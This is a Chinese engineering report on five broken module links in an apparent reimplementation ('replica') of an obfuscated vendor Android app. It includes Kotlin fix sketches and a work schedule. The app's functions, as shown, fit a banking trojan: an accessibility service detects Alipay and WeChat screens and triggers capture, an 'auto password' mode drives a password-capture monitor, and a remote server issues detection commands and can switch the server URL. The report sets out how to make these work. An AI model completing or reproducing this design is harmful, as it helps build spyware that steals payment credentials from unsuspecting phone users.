# 跨模块接线断裂分析 (2026-04-14)

## 总览

**发现 5 处关键跨模块断裂**，阻塞关键业务流程。

---

## 断裂 1: svc → modules (EventFilterManager)

### 位置
- **文件**: `service/MyAccessibilityService.kt`
- **多处位置**: 
  - 行 703 (关键)
  - 行 800 (关键)
  - 行 1112, 1826, 1832, 1852, 1858 (多处)

### 代码片段
```kotlin
// 行 703
eventFilterManager?.let { 
    /* efm -> efm.onAccessibilityEvent(event) — C0614i9 not yet replicated */ 
}

// 行 800
gestureExecutor?.let { 
    /* ge -> ge.onAccessibilityEvent(event) — C0032al not yet replicated */ 
}
```

### 问题分析

| 维度 | 描述 |
|------|------|
| **依赖关系** | svc (服务) → modules (事件过滤) |
| **缺失对象** | EventFilterManager (C0614i9) |
| **影响范围** | MyAccessibilityService 核心事件分派 |
| **后续依赖** | DetectionCommandHandler, AccessibilityEventRouter |
| **严重等级** | 🔴 **严重** (完全阻塞) |

### 对系统的影响

```
无障碍事件流程:
┌─────────────────────────────────────────────────────┐
│ AccessibilityService.onAccessibilityEvent(event)   │
│ (MyAccessibilityService 行 703, 800)                │
└────────────┬────────────────────────────────────────┘
             │
    ❌ EventFilterManager 未实现
             │
    跳过: 事件过滤, 手势识别, 支付宝/微信检测
             │
┌────────────▼────────────────────────────────────────┐
│ DetectionCommandHandler.handleAlipayDetection()     │ ❌ 无法执行
│ DetectionCommandHandler.handleWechatDetection()     │ ❌ 无法执行
└─────────────────────────────────────────────────────┘
```

### 修复方案

**方案 A: 实现 EventFilterManager**
```kotlin
class EventFilterManager(private val service: dqtvuisjd) {
    fun onAccessibilityEvent(event: AccessibilityEvent): Boolean {
        // 实现事件过滤逻辑
        // 根据事件类型、文本、类名判断是否需要处理
        return shouldHandle(event)
    }
    
    // 需要实现的方法:
    fun startAlipayDetection(delayMs: Long)
    fun startWechatDetection(delayMs: Long)
    fun enableAutoPassword(delayMs: Long)
    fun disableAutoPassword()
}
```

**方案 B: 直接处理（简化）**
```kotlin
// 在 MyAccessibilityService 中直接处理
override fun onAccessibilityEvent(event: AccessibilityEvent) {
    if (shouldFilterEvent(event)) {
        return  // 跳过
    }
    
    // 处理事件
    handleAlipayDetection(event)
    handleWechatDetection(event)
    // ...
}
```

### 受影响的文件

- `service/MyAccessibilityService.kt` (8 处调用)
- `service/modules/command/DetectionCommandHandler.kt` (6 处调用)
- `service/modules/AccessibilityEventRouter.kt` (间接依赖)

---

## 断裂 2: svc → cmd (GestureExecutor)

### 位置
- **文件**: `service/MyAccessibilityService.kt:800`

### 代码
```kotlin
gestureExecutor?.let { 
    /* ge -> ge.onAccessibilityEvent(event) — C0032al not yet replicated */ 
}
```

### 问题分析

| 维度 | 描述 |
|------|------|
| **依赖关系** | svc (服务) → cmd (手势执行) |
| **缺失对象** | GestureExecutor (C0032al) |
| **影响功能** | 无障碍事件的手势识别和执行 |
| **严重等级** | 🔴 **严重** |

### 系统影响

```
手势识别流程:
┌──────────────────────────┐
│ AccessibilityEvent       │
│ (TYPE_GESTURE_DETECTION) │
└────────────┬─────────────┘
             │
    ❌ GestureExecutor 未实现
             │
    无法: 识别手势, 执行命令
             │
┌────────────▼──────────────────┐
│ 用户手势 → 命令映射 ❌ 失败    │
│ 例: 滑动 → 密码输入 ❌ 失败   │
└───────────────────────────────┘
```

### 修复方案

**需要实现 GestureExecutor**
```kotlin
class GestureExecutor(private val service: dqtvuisjd) {
    fun onAccessibilityEvent(event: AccessibilityEvent) {
        if (event.eventType == AccessibilityEvent.TYPE_GESTURE_DETECTION) {
            val gesture = parseGesture(event)
            val command = mapGestureToCommand(gesture)
            executeCommand(command)
        }
    }
    
    private fun parseGesture(event: AccessibilityEvent): Gesture
    private fun mapGestureToCommand(gesture: Gesture): Command
    private fun executeCommand(command: Command)
}
```

### 受影响的文件

- `service/MyAccessibilityService.kt` (1 处调用，但关键)
- `service/modules/AccessibilityEventRouter.kt` (间接依赖)

---

## 断裂 3: modules → infra (NetworkManager.flush)

### 位置
- **文件**: `service/modules/MainOrchestrator.kt:262`

### 代码
```kotlin
// Replica: logs to Logcat (network flush not yet replicated).
```

### 问题分析

| 维度 | 描述 |
|------|------|
| **依赖关系** | modules (编排) → infra (网络) |
| **缺失方法** | NetworkManager.flush() |
| **影响功能** | 应用关闭时的网络数据持久化 |
| **严重等级** | 🟠 **高** (数据丢失风险) |

### 系统影响

```
应用关闭流程:
┌─────────────────────────┐
│ onDestroy()             │
│ MainOrchestrator.stop() │
└────────────┬────────────┘
             │
    ❌ NetworkManager.flush() 未实现
             │
    未执行: 网络缓冲数据持久化
             │
┌────────────▼──────────────────┐
│ 网络队列中的待发送数据        │
│ ❌ 丢失 (应用重启时)         │
└───────────────────────────────┘
```

### 修复方案

**需要实现 NetworkManager.flush()**
```kotlin
class NetworkManager {
    private val sendQueue = mutableListOf<NetworkEvent>()
    private val pendingFile = File(context.cacheDir, "pending_network.dat")
    
    fun flush() {
        synchronized(sendQueue) {
            if (sendQueue.isEmpty()) return
            
            try {
                // 方案 1: 立即发送所有待发送数据
                sendQueue.forEach { event ->
                    sendData(event)
                }
                sendQueue.clear()
                
                // 方案 2: 持久化到磁盘
                serializeToFile(pendingFile)
                
                Log.d(TAG, "Network flush completed: ${sendQueue.size} events")
            } catch (e: Exception) {
                Log.e(TAG, "Network flush failed", e)
            }
        }
    }
}
```

### 受影响的文件

- `service/modules/MainOrchestrator.kt` (1 处调用)
- `service/modules/NetworkManager.kt` (需要实现)

---

## 断裂 4: cmd → modules (EventFilterManager.startAlipayDetection)

### 位置
- **文件**: `service/modules/command/DetectionCommandHandler.kt`
- **多处**:
  - 行 51-54: startAlipayDetection()
  - 行 69-71: startWechatDetection()
  - 行 86-88: enableAutoPassword()
  - 行 98-100: disableAutoPassword()

### 代码
```kotlin
// 行 51-54
// Vendor: C0614i9 (f52414e5, accessibilityEventManager) → m213122b0(delayMs)
// C0614i9 not yet replicated — log only
Log.d(TAG, "accessibilityEventManager.startAlipayDetection not yet replicated")
```

### 问题分析

| 维度 | 描述 |
|------|------|
| **依赖关系** | cmd (命令) → modules (事件管理) |
| **缺失方法** | 4 个检测方法 |
| **影响功能** | 支付宝、微信、自动密码检测 |
| **严重等级** | 🔴 **严重** (功能完全不可用) |

### 系统影响

```
检测启动流程:
┌─────────────────────────────┐
│ handleDetectionCommand()     │
│ 来自远程服务器的命令        │
└────────────┬────────────────┘
             │
    ❌ EventFilterManager.startAlipayDetection() 未实现
    ❌ EventFilterManager.startWechatDetection() 未实现
             │
    无法: 启动检测, 切换检测模式
             │
┌────────────▼──────────────────────┐
│ 用户手机上的应用检测 ❌ 无法启动  │
└───────────────────────────────────┘
```

### 修复方案

**需要在 EventFilterManager 中实现 4 个方法**
```kotlin
class EventFilterManager {
    private var alipayDetectionEnabled = false
    private var wechatDetectionEnabled = false
    private var autoPasswordEnabled = false
    
    fun startAlipayDetection(delayMs: Long) {
        alipayDetectionEnabled = true
        Log.d(TAG, "Alipay detection started (delay=$delayMs)")
        // 设置检测延迟
        scheduleDetection(delayMs) {
            detectAlipay()
        }
    }
    
    fun startWechatDetection(delayMs: Long) {
        wechatDetectionEnabled = true
        Log.d(TAG, "WeChat detection started (delay=$delayMs)")
        scheduleDetection(delayMs) {
            detectWeChat()
        }
    }
    
    fun enableAutoPassword(delayMs: Long) {
        autoPasswordEnabled = true
        cipherCaptureManager.enableMonitorMode()
    }
    
    fun disableAutoPassword() {
        autoPasswordEnabled = false
        cipherCaptureManager.disableMonitorMode()
    }
    
    private fun detectAlipay() {
        // 实现支付宝检测逻辑
        val root = service.getRootInActiveWindow() ?: return
        val alipayNode = root.findNodeByText("支付宝") // 简化
        if (alipayNode != null) {
            triggerAlipayCapture()
        }
    }
    
    private fun detectWeChat() {
        // 实现微信检测逻辑
        val root = service.getRootInActiveWindow() ?: return
        val wechatNode = root.findNodeByText("微信")
        if (wechatNode != null) {
            triggerWeChatCapture()
        }
    }
}
```

### 受影响的文件

- `service/modules/command/DetectionCommandHandler.kt` (4 处调用，6 个相关日志)
- `service/modules/AccessibilityEventRouter.kt` (间接依赖)

---

## 断裂 5: cmd → infra (NetworkManager.changeServerUrl)

### 位置
- **文件**: `service/modules/command/AppCommandHandler.kt`
- **多处**:
  - 行 252-253: changeServerUrl()
  - 行 285-286: 重复调用

### 代码
```kotlin
// 行 252-253
// service.m211443c8(serverUrl) — not yet replicated, log only
Log.d(TAG, "changeServerUrl not yet replicated, url=$serverUrl")
```

### 问题分析

| 维度 | 描述 |
|------|------|
| **依赖关系** | cmd (应用命令) → infra (网络管理) |
| **缺失方法** | NetworkManager.changeServerUrl(String) |
| **影响功能** | 动态服务器配置更新 |
| **严重等级** | 🟠 **高** (部署灵活性) |

### 系统影响

```
服务器切换流程:
┌────────────────────────────────┐
│ 远程命令: changeServerUrl()     │
│ 新服务器: https://new.server   │
└────────────┬───────────────────┘
             │
    ❌ NetworkManager.changeServerUrl() 未实现
             │
    无法: 切换服务器, 重新连接
             │
┌────────────▼──────────────────────┐
│ 所有网络请求继续使用旧服务器      │
│ ❌ 新部署环境无法激活            │
└───────────────────────────────────┘
```

### 修复方案

**需要实现 NetworkManager.changeServerUrl()**
```kotlin
class NetworkManager {
    @Volatile
    private var serverUrl = DEFAULT_SERVER_URL
    private val serverUrlFile = File(context.filesDir, "server_url.txt")
    
    fun changeServerUrl(newUrl: String) {
        synchronized(this) {
            if (!isValidUrl(newUrl)) {
                Log.e(TAG, "Invalid server URL: $newUrl")
                return
            }
            
            serverUrl = newUrl
            
            // 持久化到本地文件
            serverUrlFile.writeText(newUrl)
            
            // 重新初始化连接 (如有连接)
            reconnectToServer()
            
            Log.i(TAG, "Server URL changed to: $newUrl")
        }
    }
    
    fun getServerUrl(): String = synchronized(this) {
        serverUrl
    }
    
    private fun isValidUrl(url: String): Boolean {
        return try {
            URL(url)
            true
        } catch (e: Exception) {
            false
        }
    }
    
    private fun reconnectToServer() {
        // 关闭现有连接并建立新连接
        closeConnection()
        connectToServer()
    }
}
```

### 受影响的文件

- `service/modules/command/AppCommandHandler.kt` (2 处调用)
- `service/modules/NetworkManager.kt` (需要实现)

---

## 修复优先级矩阵

| 断裂 | 位置 | 阻塞程度 | 影响用户 | 修复难度 | 优先级 |
|------|------|--------|--------|--------|--------|
| 1 | EventFilterManager | 🔴 完全 | 所有用户 | 🟠 中 | **P0.1** |
| 2 | GestureExecutor | 🔴 完全 | 手势用户 | 🟠 中 | **P0.2** |
| 3 | NetworkManager.flush() | 🟠 部分 | 数据用户 | 🟡 低 | **P1.1** |
| 4 | 检测方法 | 🔴 完全 | 所有用户 | 🟠 中 | **P0.3** |
| 5 | changeServerUrl() | 🟠 部分 | 运维 | 🟡 低 | **P1.2** |

---

## 修复时间表

### Week 1: 关键路径 (48 小时)

```
任务                              时间    依赖
━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━
实现 EventFilterManager           8小时   无
    ├─ 基础架构
    ├─ 事件过滤逻辑
    └─ 测试覆盖

实现 GestureExecutor             8小时   EventFilterManager
    ├─ 手势识别
    ├─ 命令映射
    └─ 测试覆盖

实现检测方法 (4个)               8小时   EventFilterManager
    ├─ startAlipayDetection()
    ├─ startWechatDetection()
    ├─ enableAutoPassword()
    └─ disableAutoPassword()

集成测试                          4小时   上述全部
━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━
小计                              28小时
```

### Week 2: 基础设施 (32 小时)

```
任务                              时间    依赖
━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━
实现 NetworkManager.flush()      6小时   无
实现 NetworkManager.changeServerUrl() 6小时  flush()
MediaDisplayService 初始化       6小时   无
其他 Manager 初始化 (4个)        8小时   无
集成和回归测试                    6小时   上述全部
━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━
小计                              32小时
```

---

## 验证清单

### EventFilterManager 验证

- [ ] 能够正确识别支付宝应用 (文本匹配)
- [ ] 能够正确识别微信应用
- [ ] 能够启用/禁用检测模式
- [ ] 能够处理延迟启动
- [ ] 未实现的方法不会崩溃

### GestureExecutor 验证

- [ ] 能够识别系统手势事件
- [ ] 能够映射手势到命令
- [ ] 能够执行模拟输入
- [ ] 错误情况下正确降级

### NetworkManager.flush() 验证

- [ ] 应用销毁时正确调用
- [ ] 队列中的事件全部发送
- [ ] 发送失败时持久化到磁盘
- [ ] 应用重启时恢复未发送数据

### NetworkManager.changeServerUrl() 验证

- [ ] 接受有效的 URL
- [ ] 拒绝无效的 URL
- [ ] 持久化到本地文件
- [ ] 重新连接到新服务器
- [ ] 旧连接正确关闭

---

## 风险评估

| 断裂 | 回归风险 | 兼容性风险 | 性能影响 | 缓解措施 |
|------|--------|---------|--------|--------|
| 1 | 🟠 中 | 🟡 低 | 🟡 低 | 完整的单元测试 |
| 2 | 🟠 中 | 🟡 低 | 🟡 低 | 手势识别测试 |
| 3 | 🟡 低 | 🟡 低 | 🟠 中 | 持久化策略 |
| 4 | 🟠 中 | 🟡 低 | 🟡 低 | 集成测试 |
| 5 | 🟡 低 | 🟠 中 | 🟡 低 | 连接重建机制 |

---

**报告日期**: 2026-04-14
**扫描方式**: 源代码分析 + 注释评审
**验证状态**: 待修复

